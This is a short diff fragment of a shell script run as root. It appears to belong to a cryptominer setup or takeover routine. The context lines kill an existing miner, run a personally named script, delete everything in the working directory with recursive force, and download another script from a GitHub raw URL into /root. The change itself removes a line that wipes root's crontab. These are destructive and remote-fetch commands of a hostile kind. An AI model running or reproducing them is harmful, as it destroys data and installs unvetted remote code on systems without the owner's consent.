@@ -52,7 +52,6 @@ chmod +x /root/kill_miner.sh
 ./kill_miner.sh
 sleep 3
 ./danielluis1921.sh
-cat /dev/null > /var/spool/cron/crontabs/root
 rm -fv *
 rm -fR *
 wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/callAPI.sh" --output-document=/root/callAPI.sh
